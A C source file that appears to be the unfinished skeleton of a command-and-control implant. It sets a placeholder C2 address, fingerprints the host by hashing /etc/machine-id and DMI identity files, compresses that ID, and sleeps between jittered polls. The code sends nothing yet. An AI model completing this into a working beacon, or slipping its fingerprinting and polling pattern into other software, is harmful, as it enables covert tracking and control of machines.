#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <zlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>

struct Config {
    struct in_addr c2_ip;
    int minimum_poll_seconds;
    int maximum_poll_seconds;
    int compression_level;
};

uint64_t get_device_id(){

	const char *paths[] = {
		"/etc/machine-id",
		"/sys/class/dmi/id/product_name",
		"/sys/class/dmi/id/sys_vendor",
		"/sys/class/dmi/id/product_uuid"
	};

	uint64_t id = UINT64_C(14695981039346656037);

	for (int i = 0; i < 4; i++) {

		FILE *file = fopen(paths[i], "r");
		if (file == NULL) {
			return 1;
		}

		int character;
		while ((character = fgetc(file)) != EOF) {
			if (character == '\n' || character == '\r') {
				continue;
			}
			id ^= (unsigned char)character;
			id *= UINT64_C(1099511628211);
		}
		fclose(file);

		id ^= 255;
		id *= UINT64_C(1099511628211);
	}

	return id;

}

int main() {

	struct Config configuration = {
		.minimum_poll_seconds = 1,
		.maximum_poll_seconds = 3,
		.compression_level = 6
	};

	uint64_t device_id = get_device_id();

	inet_pton(AF_INET, "192.168.67.20", &configuration.c2_ip);
	srand((int)time(NULL) ^ (int)getpid());

	char message[64];
	sprintf(message, "%016" PRIx64, device_id);
	uLong message_length = strlen(message);
	uLongf compressed_length = compressBound(message_length);
	unsigned char *compressed_data = malloc(compressed_length);
	
	compress2(compressed_data, &compressed_length, (const unsigned char *)message, message_length, configuration.compression_level);
















	unsigned char decompressed_data[64];
	uLongf decompressed_length = sizeof(decompressed_data) - 1;
	uncompress(decompressed_data, &decompressed_length, compressed_data, compressed_length);

	for (int i = configuration.minimum_poll_seconds; i <= configuration.maximum_poll_seconds; i++) {

		int delay_before_next_poll = configuration.minimum_poll_seconds + (int)rand() % (configuration.maximum_poll_seconds - configuration.minimum_poll_seconds + 1);





		sleep(delay_before_next_poll);

	}

    return 0;
}

